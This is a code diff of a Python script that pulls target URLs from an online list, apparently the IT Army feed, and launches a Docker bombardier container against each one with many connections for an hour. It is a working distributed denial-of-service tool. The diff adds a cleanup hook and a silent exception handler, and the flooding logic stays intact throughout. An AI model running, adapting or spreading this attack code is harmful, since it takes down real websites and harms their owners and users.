@@ -6,16 +6,23 @@ import docker
 from settings import *
 import time
 from kill_all_containers import containers_clean
+import atexit
+
+
+atexit.register(containers_clean)
+
 
 
 def kill_servers():
     urls = URLS[:LIMIT] if URLS else json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)[:LIMIT]
-    urls = [url.strip().decode('UTF-8') for url in urls]
+    try:
+        urls = [url.strip().decode('UTF-8') for url in urls]
+    except Exception as e:
+        pass
     print(urls)
     client = docker.from_env()
     for url in urls:
-        cont = client.containers.run("alpine/bombardier:latest", f'-c {CONNECTIONS} -d 3600s -l {url}', detach=True,
-                                     )
+        cont = client.containers.run("alpine/bombardier:latest", f'-c {CONNECTIONS} -d 3600s -l {url}', detach=True)
         print(cont.logs())
 
 
